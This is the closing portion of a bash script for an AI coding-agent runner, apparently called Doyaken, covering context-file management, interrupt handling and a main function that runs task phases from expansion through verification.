get_context_file() {
  local task_id="$1"
  echo "$STATE_DIR/context-${task_id}.md"
}

# Append structured context from a phase attempt
append_phase_context() {
  local task_id="$1"
  local phase="$2"
  local attempt="$3"
  local content="$4"

  local context_file
  context_file=$(get_context_file "$task_id")

  # Append structured block
  {
    echo ""
    echo "## Phase: $phase — Attempt $attempt"
    echo "Timestamp: $(date '+%Y-%m-%d %H:%M')"
    echo -e "$content"
    echo ""
  } >> "$context_file"

  # Cap at ~200 lines - trim oldest entries if exceeded
  if [ -f "$context_file" ]; then
    local line_count
    line_count=$(wc -l < "$context_file" | tr -d ' ')
    if [ "$line_count" -gt 200 ]; then
      local trim_lines=$((line_count - 150))
      tail -n +$((trim_lines + 1)) "$context_file" > "${context_file}.tmp"
      mv "${context_file}.tmp" "$context_file"
    fi
  fi
}

# ============================================================================
# Cleanup
# ============================================================================

cleanup() {
  if [ "$INTERRUPTED" = "1" ]; then
    log_info "Interrupted - run 'dk run' again to resume"
  else
    log_info "Cleaning up..."
  fi

  stop_phase_monitor
}

handle_interrupt() {
  echo ""
  log_warn "Ctrl+C received - shutting down..."
  INTERRUPTED=1

  # Kill background monitors immediately (they now have signal handlers)
  stop_phase_monitor

  # Kill all remaining child processes (agent pipeline, tee, etc.)
  pkill -P $$ 2>/dev/null || true

  exit 130
}

trap handle_interrupt INT TERM
trap cleanup EXIT

# ============================================================================
# Main
# ============================================================================

main() {
  # Read prompt from environment (set by cli.sh)
  local task_prompt="${DOYAKEN_PROMPT:-}"
  if [ -z "$task_prompt" ]; then
    log_error "No prompt provided. Usage: dk run \"your prompt here\""
    exit 1
  fi

  # Generate a task ID from the prompt slug (for log naming, context file)
  local task_id
  task_id=$(echo "$task_prompt" | tr '[:upper:]' '[:lower:]' | tr -cs '[:alnum:]' '-' | sed 's/^-//;s/-$//' | cut -c1-50)
  task_id="${task_id:-task}"

  log_header "Doyaken Agent Runner"
  echo ""
  echo "  Project: $PROJECT_DIR"
  echo "  Prompt: ${task_prompt:0:80}$([ ${#task_prompt} -gt 80 ] && echo "...")"
  echo "  Task ID: $task_id"
  echo "  AI Agent: $DOYAKEN_AGENT"
  echo "  Model: $DOYAKEN_MODEL"
  echo "  Max retries: $AGENT_MAX_RETRIES per phase"
  echo "  Phase monitor: every ${PHASE_MONITOR_INTERVAL}s, stall warning at ${PHASE_STALL_THRESHOLD}s"
  if [ "$AGENT_QUIET" = "1" ]; then
    echo "  Output: quiet (no streaming)"
  elif [ "$AGENT_PROGRESS" != "1" ]; then
    echo "  Output: full stream (verbose)"
  else
    echo "  Output: progress (one-line updates)"
  fi
  echo ""
  echo "  Phases:"
  echo "    0. EXPAND    ${TIMEOUT_EXPAND}s  $([ "$SKIP_EXPAND" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    1. TRIAGE    ${TIMEOUT_TRIAGE}s  $([ "$SKIP_TRIAGE" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    2. PLAN      ${TIMEOUT_PLAN}s  $([ "$SKIP_PLAN" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    3. IMPLEMENT ${TIMEOUT_IMPLEMENT}s  $([ "$SKIP_IMPLEMENT" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    4. TEST      ${TIMEOUT_TEST}s  $([ "$SKIP_TEST" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    5. DOCS      ${TIMEOUT_DOCS}s  $([ "$SKIP_DOCS" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    6. REVIEW    ${TIMEOUT_REVIEW}s  $([ "$SKIP_REVIEW" = "1" ] && echo "[SKIP]" || echo "")"
  echo "    7. VERIFY    ${TIMEOUT_VERIFY}s  $([ "$SKIP_VERIFY" = "1" ] && echo "[SKIP]" || echo "")"
  echo ""
  echo "  Log dir: $RUN_LOG_DIR"
  echo ""

  # Check first-run warning (skip if safe mode or already acknowledged)
  if [ "${DOYAKEN_SAFE_MODE:-0}" != "1" ]; then
    check_first_run_warning
  fi

  init_state

  if ! health_check; then
    log_error "Health check failed - aborting"
    exit 1
  fi

  # Resume from interrupted session if available
  if load_session; then
    if [ -n "${LOG_DIR:-}" ] && [ -d "$LOG_DIR" ]; then
      RUN_LOG_DIR="$LOG_DIR"
      log_info "Resuming logs in: $RUN_LOG_DIR"
    fi
  fi

  validate_environment

  CONSECUTIVE_FAILURES=$(get_consecutive_failures)

  # Load circuit breaker state from previous run
  if declare -f cb_load_state &>/dev/null; then
    cb_load_state "${AGENT_ID:-agent}"
  fi

  # Save session as running
  save_session "$SESSION_ID" "running"

  # Single-shot execution: run all phases for the prompt
  local run_result=0
  run_all_phases "$task_id" "$task_prompt" || run_result=$?

  if [ "$run_result" -eq 130 ] || [ "$INTERRUPTED" = "1" ]; then
    log_warn "Interrupted during execution"
    save_session "$SESSION_ID" "interrupted"
    exit 130
  fi

  if [ "$run_result" -eq 3 ]; then
    log_warn "Execution paused - human input needed"
    log_info "Check logs for details, then re-run: dk run \"$task_prompt\""
    save_session "$SESSION_ID" "paused"
    exit 1
  fi

  if [ "$run_result" -ne 0 ]; then
    log_error "Execution failed (exit code: $run_result)"
    log_info "Check logs: $RUN_LOG_DIR"
    save_session "$SESSION_ID" "failed"
    exit 1
  fi

  # Success
  clear_session
  clear_phase_progress

  log_header "Run Complete"
  echo ""
  echo "  Project: $PROJECT_DIR"
  echo "  Prompt: ${task_prompt:0:80}$([ ${#task_prompt} -gt 80 ] && echo "...")"
  echo "  Logs: $RUN_LOG_DIR"
  echo ""

  log_success "Execution completed successfully!"
}

# ============================================================================
# Entry Point
# ============================================================================

cd "$PROJECT_DIR"

main "$@"
